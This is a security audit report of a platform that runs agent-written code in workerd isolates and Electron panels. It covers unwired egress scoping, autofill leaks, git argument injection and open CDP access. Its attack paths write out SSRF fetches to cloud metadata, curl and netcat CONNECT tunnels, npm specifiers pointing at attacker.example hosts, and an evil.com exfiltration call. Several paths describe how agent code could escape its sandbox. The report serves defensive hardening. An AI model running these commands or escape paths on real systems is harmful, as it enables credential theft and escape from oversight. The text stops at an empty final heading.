# Security Audit 05: Sandboxing, Worker Isolation, and Dynamic Code Execution

Scope: workerd lifecycle, egress proxy, build system (esbuild), panel runtime, shell core / SQLite, CDP server/bridge, git server, harness tool dispatch, adblock & autofill, process spawning.

Date: 2026-04-23
Auditor: read-only static review of `audit` branch, HEAD `bafe7bc8`.

---

## Executive summary

The highest-risk finding is that the egress-proxy infrastructure (`src/server/services/egressProxy.ts`) — consent grants, per-connection credentials, capability checking, rate limiting, circuit breaker, audit log — is **not wired into the worker runtime at all**. Workerd's generated config gives each worker and each DO a `network` service with `allow: ["public", "local"]` and `trustBrowserCas: true`, so worker code performs direct outbound TCP/TLS connections that bypass every consent and scoping primitive the proxy exists to enforce. Even if the proxy were wired up, its `CONNECT` handler performs no attribution, consent, target, or port check and would be a wide-open TCP tunnel.

Secondary findings of comparable impact:

- **Autofill credential leak into malicious sub-frames** — `AutofillManager` scans every sub-frame for login fields and will inject top-level origin credentials into a sub-frame's *main-world* JavaScript. A third-party `<iframe>` embedded on a trusted origin can trivially exfiltrate the saved password for the parent origin.
- **`git log <ref>` and `git rev-parse <ref>` accept user-controlled leading arguments** — classic git argument-injection, enabling option smuggling against server-local git.
- **Unvalidated npm version string in `getBuildNpm`** — the specifier is validated but the version is a free-form string; `file:…`, `git+ssh://…`, `https://attacker.com/…` etc. are accepted and passed straight to `npm install`, letting a worker (policy `["server", "panel", "worker"]`) pull arbitrary remote tarballs or local paths onto the host. `--ignore-scripts` is the only mitigation.
- **Electron `debugger.sendCommand` is forwarded without command allow-listing**. Because the CDP WebSocket server binds `0.0.0.0` and accepts any valid panel token, a leaked token yields full page RCE through methods like `Page.navigate`, `Runtime.evaluate`, `Fetch.enable`, etc.
- **`net.connect(port, host)` in the egress proxy's CONNECT handler is unconditional** — reachable from any attributed HTTP client and, because the proxy server binds `127.0.0.1`, from anything that can reach loopback. Combined with cap'n-proto–generated workerd routing, a malicious panel sharing the host could CONNECT to `169.254.169.254:80` (AWS IMDS), `127.0.0.1:22` (SSH), etc.

Below, findings are severity-ordered with file:line, concrete attack paths, and concrete remediations.

---

## Threat model (what the sandbox is defending)

NatStack runs agent-authored TypeScript on three rails:

1. **Panels** — bundled to browser ESM by esbuild, served by an in-process HTTP server, run in an Electron BrowserView or standalone browser. Isolated at the V8 page level, talking RPC back to the server over WebSocket (with per-panel TokenManager tokens).
2. **Workers / Durable Objects** — bundled for the `workerd` runtime, spawned as one child `workerd` process with one Cap'n-Proto config encoding every worker + DO namespace. Each service is a V8 isolate inside workerd, talking to the server via an HTTP RPC back-channel, and to the outside world via a per-worker `network: …` service.
3. **Harness tools** — `grep`, `find`, `ls`, `read`, `write`, `edit` run inside the agent worker DO as JavaScript against an RPC-backed `RuntimeFs` whose server implementation (`packages/shared/src/fsService.ts`) sandboxes paths to a per-context folder.

The primitives the stack is supposed to enforce:

- **File isolation**: workers/panels can only see their context folder (`FsService.sandboxPath`).
- **Egress scoping**: outbound network traffic must go through `EgressProxy`, which routes by provider manifest, requires a consent grant, attaches the right credential, rate-limits, trips a breaker on failure, and logs every request.
- **RPC authorization**: every cross-process call is authenticated by a `TokenManager` token scoped to a `callerKind` (panel / worker / shell / server) and restricted by per-service policy.
- **CDP access**: only the direct parent / tree-ancestor panel of a browser tab can issue Chrome-DevTools-Protocol commands against it.
- **Git scoping**: panels can fetch anything they have a token for, but can only push to `tree/<panelId>…` or `singleton/<panelId>…` paths.

"Sandbox escape" here means: agent-generated code that reaches Node APIs in the main server process, reads main-process memory, or bypasses any of the above rails.

---

## Findings (severity order)

### S1 — Critical: EgressProxy is dead code; workers have unscoped network egress

**Files**: `src/server/services/egressProxy.ts:1-590`, `src/server/workerdManager.ts:382-406`, `src/server/workerdManager.ts:462-491`

The proxy is implemented — attribution headers, consent check via `providerRegistry.getCapabilityDeclarations`, credential injection, rate limiter, circuit breaker, audit log. No caller in `src/` ever instantiates it. A grep for `createEgressProxy`, `new EgressProxy` across `src/server/` and `src/main/` returns only the declaration itself:

```
$ grep -rn "createEgressProxy\|new EgressProxy" src/
src/server/services/egressProxy.ts:580:export function createEgressProxy(deps: EgressProxyDeps): EgressProxy {
src/server/services/egressProxy.ts:581:  return new EgressProxy(deps);
```

Instead, each worker / DO gets a plain workerd `network` service wired as `globalOutbound`:

```ts
// src/server/workerdManager.ts:462-491
const networkServiceName = `${name}_network`;
…
services.push({
  name: networkServiceName,
  network: {
    allow: ["public", "local"],
    deny: [],
    tlsOptions: { trustBrowserCas: true },
  },
});
```

`allow: ["public", "local"]` means workerd will let the worker's `fetch()` reach every public IP and every loopback / link-local / private-RFC1918 address, and `trustBrowserCas: true` lets it speak TLS to them. The `RPC_AUTH_TOKEN` that the worker is issued is a real credential to the server's `/rpc` endpoint but it is handed to the worker — so any code the worker runs can call RPC as itself.

**Concrete attack paths** (all executable from any worker/DO JS):

- `fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/…")` — AWS IMDSv1, no token. The proxy's per-provider manifest machinery was the only thing that would have blocked this.
- `fetch("http://127.0.0.1:${rpcPort}/rpc", { headers: { authorization: "Bearer "+RPC_AUTH_TOKEN }, body: JSON.stringify({ service:"workerd", method:"createInstance", args:[{ source:"workers/attacker", contextId:"ctx", name:"x", …}]})})` — privilege-escalate by RPC'ing `workerd.createInstance` with arbitrary `source` / `stateArgs`. (`workerdService.policy.allowed` includes `"worker"`, so callerKind=worker is acceptable.)
- `fetch("http://localhost:${gitServerPort}/…")` — every worker has a `gitToken` in its env via `buildPanelEnv` if created from a panel. `GitAuthManager.canAccess` allows fetch for any authenticated token, so a compromised worker can clone any repo the git server knows about, including `github.com/<any>/<any>` (auto-clone is triggered by the fetch).
- Any on-host service: Redis at 6379, Postgres at 5432, Elasticsearch at 9200, the developer's ssh-agent UNIX socket forwarded over TCP, etc.
- Data exfiltration to any attacker-controlled host with no audit trail.

**The audit log, consent grants, rate limiter, and capability checks referenced in `docs/credential-system.md` provide zero protection while the proxy is unwired.**

**Remediation**:

1. Wire `EgressProxy.start()` into server startup, pick a loopback port, and inject it into workerd config as either:
   - a `globalOutbound` that points at an `externalServer: { address: "127.0.0.1:$egressPort", http: { … } }` — workerd can be configured to have outbound HTTP go through an external HTTP proxy by treating the proxy as an external service and URL-rewriting, though this is non-trivial with Cap'n-Proto config; or
   - remove the per-worker `network` service entirely and force every outbound through a fetch-binding that the worker must call explicitly.
2. Until (1) lands, at minimum set `network.deny` to the RFC1918 / loopback / link-local / ULA set and remove `"local"` from `allow`. `deny` takes CIDR blocks in workerd.
3. Do not give workers the `gitToken` / `RPC_AUTH_TOKEN` by default — today they land in the worker's env in cleartext, and since outbound is unrestricted the worker can re-use either from inside its own process or leak them.

Severity: **Critical** — this is the stated mechanism protecting credentials and it does not run.

---

### S2 — Critical: CONNECT tunneling in EgressProxy is unauthenticated and unfiltered

**File**: `src/server/services/egressProxy.ts:274-336`

Even if the proxy were wired up, the CONNECT handler does not gate on attribution, consent, provider, port, or host:

```ts
// egressProxy.ts:274
private async handleConnect(req, socket, _head): Promise<void> {
  const startedAt = Date.now();
  const attribution = this.attributeRequest(req);  // computed, NEVER enforced
  const authority = req.url ?? "";
  const [host, portStr] = authority.split(":");
  const port = parseInt(portStr || "443", 10);
  …
  const upstream = netConnect(port, host || authority, () => {
    socket.write("HTTP/1.1 200 Connection Established\r\n\r\n");
    …
    upstream.pipe(socket);
    socket.pipe(upstream);
    …
  });
```

`netConnect(port, host)` is a raw TCP socket to anywhere — there is no host allow-list, no port allow-list, no consent check, no rate limiter, and no breaker. Any caller that reaches the proxy port can open arbitrary TCP tunnels. `attribution` is computed only to populate the audit log; failure does not short-circuit the connection.

The proxy server binds `127.0.0.1` (`egressProxy.ts:123`), but that is also where every panel, worker, and local tool lives, so "only loopback can reach it" is not a meaningful defence.

**Concrete attack**: `curl -x http://127.0.0.1:$EGRESS_PORT https://169.254.169.254/` → instant SSRF to cloud metadata. `netcat -X connect -x 127.0.0.1:$EGRESS_PORT 127.0.0.1 22` → loopback port-scan / SSH banner grab. The fact that the proxy currently isn't started just means that the hole is dormant rather than fatal.

**Remediation**:

- Before `netConnect`, call `attributeRequest`, `routeProvider(new URL("https://" + authority))`, and reject with 403 if no provider matches. If a provider matches, enforce rate limiter and breaker the same way HTTP does, and require that the target host:port set matches the manifest's `apiBase`.
- Enforce a hard-coded deny list for `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `[::1]`, `[fc00::/7]`, `[fe80::/10]`. DNS-resolve the host *before* connecting and compare the resolved address to the deny list — otherwise a public hostname that resolves to 169.254.x.x defeats a hostname-string check (classic DNS-rebinding precursor).
- Never allow CONNECT to ports other than 443 (HTTPS) unless the matched provider explicitly requires a non-443 port.

Severity: **Critical** when the proxy is enabled; dormant until then.

---

### S3 — Critical: Autofill leaks top-origin credentials into untrusted sub-frames (main world)

**File**: `src/main/autofill/autofillManager.ts:360-397`, `src/main/autofill/autofillManager.ts:512-559`, `src/main/autofill/contentScript.ts:439-460`

`scanSubFrames` iterates every frame in the subtree and uses `frame.executeJavaScript(...)` — which runs in the **main world** of the target frame, not an isolated world:

```ts
// autofillManager.ts:371-386
for (const frame of mainFrame.framesInSubtree) {
  if (frame === mainFrame || frame.isDestroyed()) continue;
  try {
    const hasFields = await frame.executeJavaScript(getFrameScanScript());
    if (hasFields) {
      await frame.executeJavaScript(getIframeContentScript());
      state.activeFrame = frame;
      state.iframesScanned = true;
      …
      const pulled = await frame.executeJavaScript(getPullStateScript()) as PulledState | null;
      if (pulled?.fields) {
        await this.processPulledState(wcId, wc, state, pulled);
      }
```

`processPulledState` → `fillCredential` → `executeInActiveFrame` injects `getFillScript(usernameSelector, passwordSelector, username, password)` into the **sub-frame's main world** via `state.activeFrame.executeJavaScript(script)` (`autofillManager.ts:350-355`, `512-535`). The credentials used are `state.credentials`, selected by *`state.origin`* which is `deriveOrigin(wc)` = the **top frame's URL** (`autofillManager.ts:868-880`).

Attack:

1. bank.com (legitimately saved `user@bank` / `hunter2` for origin `https://bank.com`) embeds `<iframe src="https://evil.com/login.html">`.
2. `evil.com/login.html` exposes `<input type="text">` + `<input type="password">`.
3. `AutofillManager.scanSubFrames` finds the password field in evil.com's frame, marks it `activeFrame`, and calls `fillCredential` with `bank.com`'s stored credentials.
4. Fill script runs in evil.com's main world: before `HTMLInputElement.prototype.value` setter writes, `evil.com` JavaScript can `Object.defineProperty(HTMLInputElement.prototype, 'value', { set() { /* exfil */ }})` or more simply hook `new Event('input', …)` on the element, or the attacker can just `addEventListener('input', …)` on their own DOM and read `.value` after the fill.

Even without hooks, because the fill runs in the sub-frame's main world, evil.com's existing `input`/`change` event listeners receive the filled value, and can `fetch("https://evil.com/steal", {method:"POST", body: value})`.

Isolated worlds would prevent (3)/(4); the main-frame content script correctly uses `executeJavaScriptInIsolatedWorld(AUTOFILL_WORLD_ID, …)` (`autofillManager.ts:338`, `354`). The iframe branch explicitly does not.

**Remediation**:

- Only autofill sub-frames whose *committed origin* matches the top-frame origin, exactly. `frame.origin` should be consulted and compared to `state.origin`; if they differ, abort.
- Use `WebFrameMain.executeJavaScriptInIsolatedWorld` (Electron supports this per-frame as of Electron 29+) if cross-origin sub-frame support is desired, but still only after the origin match check — otherwise the credential will still pass through DOM events the frame controls.
- Consider requiring user-gesture-triggered autofill for sub-frames.

Severity: **Critical** for any workflow where users have saved passwords and embed or visit sites that embed third-party iframes.

---

### S4 — High: Git argument injection via `rev-parse`, `log`, `listBranches`

**File**: `packages/git-server/src/server.ts:695-726`, `packages/git-server/src/server.ts:743-786`

```ts
// server.ts:706
const stdout = await this.runGit(
  ["log", ref, `-${limit}`, "--format=%H|%s|%an|%at"],
  absolutePath,
);
```

`ref` arrives from `createGitService.resolveRef(repoPath, ref)` → `gitService.ts:39`, whose service policy is `["shell", "panel", "server", "worker"]`. Any worker/panel can pass arbitrary `ref` strings. `runGit` uses `spawn("git", args, …)` — no shell, but git itself honours `-`/`--` flags in the positional slot.

`git log --all`, `git log --exec=`, `git log --pickaxe-regex`, `git log --follow`, and especially `git log --output-indicator-new=X --output-indicator-old=X` are mostly info-only, but `git log -U<N> --format=...` combined with log formats can exfiltrate extra info via stdout (returned from RPC). `git log --help` / `--version` are trivially observable.

More important: same pattern exists in `resolveRef`:

```ts
// server.ts:760
const result = await this.runGit(["rev-parse", targetRef], absolutePath);
```

`git rev-parse --git-dir`, `--show-toplevel`, `--show-cdup`, `--resolve-git-dir=<path>`, `--git-path <name>` allow probing the server-side filesystem layout of the repos directory. `--parseopt` will loop reading stdin but that's a no-op here.

In `effectiveVersion.ts:60`:

```ts
execFileSync("git", ["rev-parse", "--verify", ref], …);
```

Here `ref` is only `"main"` / `"master"` from `MAIN_CANDIDATES`, so that call is fine; but `effectiveVersion.ts:76` concatenates `${resolvedRef}^{tree}` which sanitises — `-x^{tree}` is still a pathspec / ref argument that git may accept as a ref since the suffix prevents it from being parsed as a flag for most subcommands. Worth a belt-and-braces `--` separator regardless.

In `gitService.ts`, `execSync('git commit -m "Initial commit"', { cwd: absolutePath, stdio: "pipe" })` uses the **shell** (`execSync` goes through `/bin/sh`). The command string is constant today, but future maintainers must be warned: one `${...}` interpolation of user input into this string becomes RCE. Prefer `execFileSync("git", ["commit", "-m", "Initial commit"], …)`.

**Remediation**:

- In every `git` CLI invocation that takes a user-controlled ref, insert `"--"` between the subcommand options and the ref, and refuse refs that start with `-`:
  ```ts
  if (targetRef.startsWith("-")) throw new Error("Invalid ref");
  return this.runGit(["rev-parse", "--", targetRef], absolutePath);
  // or for log:
  return this.runGit(["log", `-${limit}`, "--format=%H|%s|%an|%at", "--", ref], absolutePath);
  ```
- Reject refs that aren't plain `[A-Za-z0-9._/-]+` before spawning.
- Replace `execSync("git commit -m '…'")` with `execFileSync("git", [...])` everywhere, as a policy.

Severity: **High** — local info disclosure / filesystem probing by any panel/worker; potential for more depending on future subcommand use.

---

### S5 — High: `getBuildNpm` accepts unvalidated version string, letting workers pull arbitrary remote packages

**File**: `src/server/buildV2/builder.ts:1526-1653`, `src/server/services/buildService.ts:23-29`, `src/server/buildV2/externalDeps.ts:102-184`

`validateNpmSpecifier` rejects anything but `@scope/name` / `name`:

```ts
// builder.ts:1526
const NPM_NAME_RE = /^(@[a-z0-9\-~][a-z0-9\-._~]*\/)?[a-z0-9\-~][a-z0-9\-._~]*$/;
if (!NPM_NAME_RE.test(specifier)) throw new Error(...);
```

But the second argument, `version`, is fed unchanged into an npm package.json's `"dependencies": { [specifier]: version }` (`buildService.ts:23` requires `z.string()` only; `externalDeps.ts:103` / `externalDeps.ts:125-134`):

```ts
// externalDeps.ts:125
const pkgJson = {
  name: "external-deps-install", version: "0.0.0", private: true,
  dependencies: deps,   // { "foo": "<version-string-from-attacker>" }
};
fs.writeFileSync(path.join(tmpDir, "package.json"), JSON.stringify(pkgJson, null, 2));
execSync("npm install --prefer-offline --no-audit --no-fund --ignore-scripts --legacy-peer-deps", { cwd: tmpDir, timeout: 120_000 });
```

npm accepts the following as "version" specifiers in a dependency entry:

- `1.2.3`, `^1.2.3`, `latest`, `*` — benign.
- `file:/absolute/path` — lets the attacker `npm install` any local path into the cache directory. Combined with the fact that the server runs as the user, this is equivalent to "copy anything readable on the box into a cache dir", from which a later build can read it. `builder.ts:1615` does `module.exports = require(specifier)` — so the bundle can contain that directory's contents.
- `git+ssh://git@attacker.example/evil.git` — npm clones via ssh, using the server's ssh-agent and known_hosts if available.
- `https://attacker.example/evil.tgz` — npm fetches the tarball.
- `github:attacker/evil#ref` — same as git+https.

`--ignore-scripts` blocks `preinstall` / `install` / `postinstall`, so straight RCE via install hooks is prevented. But:

- The fetched code lands inside `<userData>/external-deps/<hash>/node_modules/<pkg>`, bundled into a CJS string, and handed to the requesting panel/worker to execute. A worker that loads its own returned bundle then runs attacker-controlled JavaScript inside the workerd isolate — which, per S1, has unrestricted outbound network. So the attacker has simultaneously (a) used the server as a proxy to fetch code from private repos via the dev's ssh-agent and (b) loaded that code into a live worker.
- `file:` / `github:` tarballs also cause arbitrary reads of paths readable to the server process.

`buildService.policy.allowed = ["panel", "shell", "server", "worker"]` — all user-facing tiers can invoke.

**Remediation**:

- Reject versions that aren't semver-ish: `/^(latest|\*|[~^]?\d+\.\d+\.\d+(-[a-z0-9.-]+)?(\+[a-z0-9.-]+)?)$/` (whitelist of shapes) and explicitly reject any string containing `:` or `/`.
- Pass `--no-git` to npm install if supported (or set `NPM_CONFIG_GIT=/bin/false` in the child env) to categorically block git fetching.
- Consider dropping `getBuildNpm` for the `worker` callerKind entirely — workers rebuild themselves through the git push trigger, there is no need for them to request on-demand npm packages at runtime.

Severity: **High** — exposed to worker code today.

---

### S6 — High: CDP is a full RCE primitive and is wildcard-bound with URL tokens

**Files**: `src/main/cdpServer.ts:193-370`, `src/server/cdpBridge.ts:115-153`

- `http.createServer().listen(port, () => …)` binds **all interfaces** (IPv6 unspecified `::`, which accepts IPv4 mapped too). Nothing restricts clients to loopback. `log.verbose(\` Started on ws://localhost:\${port}\`)` is misleading — the log string lies.
- Authentication is a token in the URL query string (`?token=…`). URL query strings are logged by any intermediary (reverse proxies, browsers, HAR captures, accesslog tooling), are carried in `Referer` headers if CDP responses link externally, and show up in process titles on some platforms.
- After auth, `contents.debugger.sendCommand(msg.method, msg.params, sessionId)` is called with the raw method name and params. There is no allow-list. `Runtime.evaluate`, `Page.navigate`, `Page.downloadFile`, `Network.emulateNetworkConditions`, `Fetch.fulfillRequest`, `Browser.setDownloadBehavior` with arbitrary `downloadPath`, `Page.captureScreenshot`, etc. are all reachable.
- `CdpServer.canAccessBrowser` authorises both the **direct owner** and any **tree ancestor** panel of the browser. That policy is documented (`cdpServer.ts:132-161`), but the "tree ancestor" clause means any ancestor panel compromise yields automation of every descendant browser (including navigation / XSS / cookie theft). Combined with S1 this means an agent worker can reach the CDP WebSocket directly.
- `CdpBridge` (`src/server/cdpBridge.ts:115-153`) mirrors all of this for remote / extension-backed CDP: single query-string token, same sendCommand shape.

**Attack paths**:

1. Any process on the LAN can connect once it has a panel token. Tokens are 32-char random, but they travel in logs.
2. Any panel/worker can proxy through `/rpc` to acquire its own browser's CDP endpoint (`panel.createBrowser`), which returns `getCdpEndpoint` — there's no separation between "panel may open browser" and "panel may pilot browser".
3. `contents.debugger.sendCommand("Runtime.evaluate", { expression: "<attacker-JS>" })` = full main-world execution inside the browser's webContents, which in Electron has access to `window` of arbitrary origins if the browser has navigated there — sufficient to exfiltrate cookies, session storage, etc.
4. `Page.navigate` → `file:///…` can in some Electron configurations read local files into the target page.

**Remediation**:

- Bind `127.0.0.1` explicitly: `this.server!.listen(port, "127.0.0.1", () => resolve())`. Do the same for `CdpBridge` / `/cdp/*` upgrades served by the gateway.
- Move token from query string to a WebSocket sub-protocol or an opening `authenticate` frame. At a minimum, do not log URLs that carry tokens and strip `?token=` from `req.url` before any log/audit write.
- Consider an allow-list of CDP methods. Pages need `Page.*`, `Runtime.evaluate`, `Network.*`. Worker-originated CDP probably does not need `Debugger.setBreakpoint` → `Debugger.evaluateOnCallFrame` (which can step through arbitrary JS) or `Browser.*` methods. Route each `msg.method` through a permission table.
- Require an extra confirmation gate for `Page.navigate` to `file://` / `chrome://` schemes.

Severity: **High** — token leak = full browser takeover.

---

### S7 — Medium/High: panel manifests can pull `file:` and `git+` dependencies during regular builds

**Files**: `src/server/buildV2/externalDeps.ts:28-57`, `src/server/buildV2/externalDeps.ts:102-184`

`collectTransitiveExternalDeps` walks a package graph of panels/workers and collects `dependencies` fields from *extracted package.json files*:

```ts
// externalDeps.ts:39
for (const [name, version] of Object.entries(node.dependencies)) {
  if (graph.isInternal(name)) { … continue; }
  if (version.startsWith("workspace:")) continue;
  if (!externals[name] || compareVersions(version, externals[name]!) > 0) {
    externals[name] = version;
  }
}
```

The `version` string goes straight into the dependencies dictionary passed to `ensureExternalDeps` → `npm install`. Because any panel push lands in `reposPath` and is eligible to be built (buildSystem discovers panels via `panels/*` / `packages/*` glob), a panel pushed via `git push` over the authenticated git endpoint (token-authenticated, ancestor-rule allow) can publish a `package.json` like:

```json
{ "dependencies": { "x": "file:/Users/dev/.ssh" } }
```

On next build, npm resolves `x@file:/Users/dev/.ssh` and copies that directory into the external-deps cache. `builder.ts`'s CJS bundler then bundles the package's `main` — if present. If not, the copy still sits in cache where a later crafted panel can `import "x"` from a different version and read the contents.

`--ignore-scripts` alone does not solve this.

**Remediation**: reuse the recommended fix from S5 — whitelist version shapes before feeding the set to npm.

Severity: **High** in multi-tenant setups; **Medium** in single-developer mode where the dev already owns the filesystem.

---

### S8 — Medium: `gitService.createRepo` path containment is near-miss

**File**: `src/server/services/gitService.ts:41-57`

```ts
const absolutePath = resolve(deps.workspacePath, repoPath);
if (!absolutePath.startsWith(deps.workspacePath + "/")
    && absolutePath !== deps.workspacePath) {
  throw new Error("Invalid repo path: escapes workspace root");
}
```

The check is correct on Linux/macOS but Windows-unsafe (`path.sep` is `\`), and more subtly it depends on `workspacePath` not ending in `/`. Additionally, the subsequent `execSync("git init", { cwd: absolutePath, stdio: "pipe" })` and `execSync('git commit -m "Initial commit"', { cwd: absolutePath, stdio: "pipe" })` go through the **shell**: if any future change allows interpolating user input into these command strings, it becomes RCE.

`createRepo` is in `gitService.policy.allowed = ["shell", "panel", "server", "worker"]` — invokable by a worker.

**Remediation**:

- Use `path.relative(workspacePath, absolutePath)` and reject `../` / absolute results; this avoids the trailing-slash pitfall.
- Replace both `execSync` calls with `execFileSync("git", [...])` as a policy: no git invocation should go through the shell.

Severity: **Medium**.

---

### S9 — Medium: `panelService.updateContext` resolves arbitrary absolute paths

**File**: `src/server/services/panelService.ts:402-434`

```ts
if (updates.source) {
  updatedSnapshot.source = updates.source;
  try {
    const absolutePath = path.resolve(workspacePath, updates.source);
    const manifest = loadPanelManifest(absolutePath);
    …
```

`path.resolve(workspacePath, updates.source)` obeys absolute paths: `updates.source = "/etc/whatever/package.json"` resolves to `/etc/whatever/package.json`, bypassing `workspacePath`. `loadPanelManifest` then reads `<absolutePath>/package.json` (if `absolutePath` is a directory). This is only a read-of-package-json primitive — not catastrophic — but it bypasses the `normalizeRelativePanelPath` check used in the `create` path (`panelService.ts:234`).

Impact: file-existence oracle / limited read for any caller on `panel.updateContext` (policy `["shell", "server"]`, so this is server-level risk, not exposed to panels).

**Remediation**: funnel `updates.source` through `resolveSource(updates.source, workspacePath)` like `create` does, so the `normalizeRelativePanelPath` containment applies.

Severity: **Medium** (low-value leak, reachable only by shell/server callers).

---

### S10 — Medium: Git HTTP server wildcard CORS + `Authorization` accepted

**File**: `packages/git-server/src/server.ts:270-279`

```ts
const applyCors = (res: http.ServerResponse): void => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers",
    "Authorization, Content-Type, User-Agent, X-Requested-With");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
};
```

This applies to every route, including the clone/push endpoints. Browsers refuse to send credentials with `Access-Control-Allow-Origin: *`, so a web-origin without the token cannot directly abuse the bearer, but:

- An attacker-controlled page on any origin can issue fetch POSTs to `http://localhost:<port>/<repo>.git/git-upload-pack` without credentials (which will 401) but the CORS headers teach them port availability (DNS rebinding precursor) and enumerate authentication requirements.
- If any consumer of git ever sets `Authorization` via a script that also enables `credentials: "include"`, the server — having `Access-Control-Allow-Origin: *` — would fail the browser's preflight, but if the response is only opaque the attacker still gets the side-effect of a push/clone.

**Remediation**: set `Access-Control-Allow-Origin` to the known NatStack origin(s) (the panelHttpServer origin), not `*`. Drop the CORS headers entirely for unsafe methods.

Severity: **Medium**.

---

### S11 — Medium: CDP / egress / workerd / git servers bind wildcard

**Files**: `src/main/cdpServer.ts:205`, `src/server/workerdManager.ts:550-554`, `packages/git-server/src/server.ts:312`

Multiple services pass only `port` to `http.Server.listen` — Node binds the unspecified address (`::` with dual-stack), reachable from any interface. Panel HTTP server correctly uses `this.host` (`src/server/panelHttpServer.ts:248`), the egress proxy correctly uses `127.0.0.1` (`egressProxy.ts:123`), but CDP, git, and the workerd router socket do not.

The workerd router config:

```ts
sockets: [{ name: "http", address: `*:${this.port}`, http: {}, service: { name: "router" } }]
```

`*:${port}` binds all interfaces. Every worker/DO, and anyone on the LAN, can hit the router service on that port. This also hosts the DO `/_w/...` dispatch route — the router trusts `x-forwarded-*`-style headers only if workers themselves do; since it's a workerd isolate serving HTTP, anyone reaching the port can impersonate fetches coming from the server.

**Remediation**: set workerd socket address to `127.0.0.1:${port}`. Do the same for git server and CDP server. Without this, any LAN neighbour can:

- Clone any repo the git server serves without credentials (fetch is always `allowed` by `GitAuthManager.canAccess`).
- Hit the workerd router and, if it reaches a DO with non-token-checked fetch code, interact with DO state.
- Attempt CDP token enumeration.

Severity: **Medium** in a single-dev box; **High** on shared networks.

---

### S12 — Medium: Autofill `executeJavaScript` cross-frame tree traversal runs in destroyed / cross-origin frames without try-gate around side effects

**File**: `src/main/autofill/autofillManager.ts:360-397`

Related to S3. Even if the origin match is fixed, `mainFrame.framesInSubtree` iterates every frame including cross-origin ones. The `try`/`catch` swallows errors but the *injection* itself still lands in the frame; if the script throws mid-execution the attacker-controlled frame has already observed it. Defence-in-depth: serialise origin check *before* the executeJavaScript call, not after.

Severity: **Medium**, folded into the fix for S3.

---

### S13 — Low/Medium: `ReDoS` in harness `grep` tool and `globToRegex`

**File**: `packages/harness/src/tools/grep.ts:212-258`

Users can pass an arbitrary `pattern` with `literal: false`. `new RegExp(source, flags)` + `regex.test(line)` on large lines with a catastrophic pattern (e.g. `(a+)+$`) pins a workerd isolate. This is a self-DoS (the agent is the one supplying the pattern), not an escape, but the resulting `regex.test` runs inside the DO isolate with no built-in regex timeout.

Severity: **Low** (self-DoS), unless a higher-privilege worker proxies untrusted patterns.

Remediation: enforce a reasonable `pattern` length, refuse patterns containing common catastrophic constructs (`(.*)+`, `(.+)+`, `(a|aa)+`), or use the `re2` WebAssembly engine if one is available in workerd.

---

### S14 — Low: Harness `resolveToCwd` passes absolute paths straight through

**File**: `packages/harness/src/tools/path-utils.ts:41-47`

```ts
export function resolveToCwd(filePath: string, cwd: string): string {
  const expanded = expandPath(filePath);
  if (isAbsolute(expanded)) return expanded;
  return resolvePath(cwd, expanded);
}
```

If the agent asks `grep` with `path: "/etc"`, `resolveToCwd` returns `/etc` unchanged and `RuntimeFs` is the one that must sandbox. Because `RuntimeFs` is the RPC-backed `FsService` path and `FsService.handleCall` goes through `sandboxPath(root, userPath)`, absolute paths beginning with `/` are treated as relative to `root` (`fsService.ts:45` strips the leading slash). So practically this is safe *today* — but it relies on `FsService.sandboxPath` being on the server side of every `fs.readFile` / `fs.readdir` call. Any future refactor that runs harness tools on-host (rather than through the RPC-backed `RuntimeFs`) would regress — worth adding a doc comment or defensive check here.

Severity: **Low** (defense-in-depth).

---

### S15 — Low: `FsService.sandboxPath` is TOCTOU-bounded

**File**: `packages/shared/src/fsService.ts:44-70`

```ts
// Walk path components and check for symlinks in parents.
let current = root;
for (const segment of segments) {
  current = path.join(current, segment);
  try {
    const st = await fs.lstat(current);
    if (st.isSymbolicLink()) { … }
  } catch (e) { if (e.code === "ENOENT") break; … }
}
return resolved;
```

After the per-component lstat walk, the *caller* then uses `resolved` with `fs.readFile(resolved)` or similar. Between the walk and the read, the sandboxed process can `rename` / `symlink` any component. Because only the current caller's RPC path writes into this filesystem, a single caller can only race *itself*. But a compromised worker with concurrent requests (many in flight via async RPC) can deliberately race a `symlink` into a read, turning an in-sandbox read of `./foo` into an out-of-sandbox read of `/etc/passwd`. The read target is then piped back to the worker as the response body.

Severity: **Low** — contestable in practice, but worth closing with `fs.open` + `fs.fstat` to pin the inode, or by realpath'ing the full target and re-checking containment *after* open.

---

### S16 — Low: Panel SQLite reads/writes are parameterised; one dynamic UPDATE is safe

**File**: `packages/shared/src/db/panelPersistence.ts:370`

```ts
db.prepare(`UPDATE panels SET ${updates.join(", ")} WHERE id = ?`).run(...params);
```

`updates` is not user-controlled — it's a fixed set of `column = ?` strings pushed from `updatePanel`'s body. Values flow through `params`, which are bound parameters. No SQL injection here. The `setCollapsedBatch` / `panelSearchIndex.ts` queries are similarly `prepare(…?…).run(...values)`. No findings.

---

### Stack-level observations (not ranked)

- **Workerd router code is string-concatenated** (`workerdManager.ts:608-621`). `instanceNames` are `name.replace(/[^a-zA-Z0-9_]/g, "_")` and `JSON.stringify`'d, so injection is mitigated. `doClassNames` are sanitised similarly. No bug today but it is generated JS — any future addition that forgets to sanitise is an immediate XSS-in-router.
- **Token in URL pattern** (`cdpServer.getCdpEndpoint`, `cdpBridge.getCdpEndpoint`) appears multiple times. Refactor the token carriage to `Sec-WebSocket-Protocol` once, everywhere.
- **`trustBrowserCas: true`** on worker network services (`workerdManager.ts:403`, `workerdManager.ts:489`) should be audited: for outbound traffic to public APIs it is correct, but combined with the `"local"` allow-list workers can speak TLS to loopback services too.
- **`autoCreate: true` on git server** (`server.ts:172`) means a push to any previously-unknown path creates a new repo there. Combined with `GitAuthManager.canAccess` returning `allowed: true` for non-`tree/` non-`singleton/` paths (`auth.ts:49`), a token-bearing client can `git push` to `../../../tmp/foo` — though the `normalizeRepoPath` + `node-git-server`'s `dirMap` normalization should block traversal, the combination is fragile and merits an explicit allow-list of write-permitted prefixes.
- **workerd process env inheritance** — `spawn(binary, [...], { env: { ...process.env } })` (`workerdManager.ts:693`) passes the full server environment (including any `AWS_*`, `GITHUB_TOKEN`, `ANTHROPIC_API_KEY`) to workerd. workerd's own `WORKER_*` text bindings expose the ones we intend. But a misconfigured worker or a workerd regression that reads `process.env` directly would inherit everything. Prefer `{ env: allowlist(process.env) }`.

---

## Concrete end-to-end attack chain

